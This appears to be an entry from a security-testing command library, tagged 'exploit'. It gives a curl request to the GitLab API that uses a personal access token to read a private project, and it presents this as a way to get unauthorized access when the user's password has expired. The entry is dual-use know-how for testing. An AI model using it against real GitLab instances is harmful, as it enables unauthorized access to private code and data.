---
id: cmd-uuid-1
data: >-
  curl --request GET --url https://gitlab.domain.com/api/v4/projects/:ID
  --header 'Authorization: Bearer <TOKEN>'
tags:
  - api
  - gitlab
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:29.244Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-api-access

## Command

```bash
curl --request GET --url https://gitlab.domain.com/api/v4/projects/:ID --header 'Authorization: Bearer <TOKEN>'
```

## Description

This command sends a GET request to the GitLab REST API to retrieve details of a private project using a personal access token, demonstrating unauthorized access when the user's password is expired.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--request GET` | Specifies the HTTP method | Yes |
| `--url https://gitlab.domain.com/api/v4/projects/:ID` | API endpoint; replace :ID with project ID | Yes |
| `--header 'Authorization: Bearer <TOKEN>'` | Auth header with PAT; replace <TOKEN> | Yes |

## Examples

### Basic Usage

```bash
curl --request GET --url https://gitlab.domain.com/api/v4/projects/123 --header 'Authorization: Bearer glpat-abc123'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v --request GET --url https://gitlab.domain.com/api/v4/projects/:ID --header 'Authorization: Bearer <TOKEN>'
```

## Expected Output

JSON object with project details, e.g., {"id":123,"name":"test-private","visibility":"private",...}, confirming access on success (HTTP 200).

## Related

- [[Related Procedure: Exploit-API-Access-with-Expired-Token]]
